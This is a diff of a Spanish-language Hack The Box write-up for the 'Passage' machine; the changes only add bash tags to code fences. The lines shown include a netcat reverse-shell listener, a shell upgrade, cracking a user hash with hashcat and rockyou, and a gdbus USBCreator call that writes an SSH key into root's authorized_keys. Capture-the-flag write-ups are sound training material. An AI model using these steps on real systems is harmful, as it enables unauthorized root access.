@@ -50,7 +50,7 @@ Lo siguiente es ponerme en escucha en el puerto 9001 con rlwrap nc -lvnp 9001 y 
 
 Convierto la shell en una shell totalmente interactiva.
 Con which python compruebo de tiene python instalado, y luego como siempre:
-```
+```bash
 python -c ‘import pty;pty.spawn(“/bin/bash”)’
 ctrl + z
 stty raw -echo
@@ -71,7 +71,7 @@ Y contiene lo siguiente:
 
 Mirando con `echo “texto” | base64 -d` en cada una de las cadenas de texto veo que hay algunas que tienen un hash de usuario.
 
-```
+```bash
 a:1:{s:4:"name";a:1:{s:10:"paul-coles";a:9:
 
 {s:2:"id";s:10:"1592483236";s:4:"name";s:10:"paul-
@@ -104,7 +104,9 @@ invalid input
 
 Me guardo el hash de paul en un fichero y lo crackeo con hashcat
 
-`hashcat -m 1400 paul.hash tools/wordlist/rockyou.txt`
+```bash
+hashcat -m 1400 paul.hash tools/wordlist/rockyou.txt
+```
 
 ![](/assets/images/Passage-Hackthebox/hashcat.png)
 
@@ -136,7 +138,7 @@ Ya que puedo crear ficheros con privilegios de root, me creo en mi máquina un p
 
 Por último ejecuto
 
-```
+```bash
 gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /dev/shm/key /root/.ssh/authorized_keys true
 ```
 
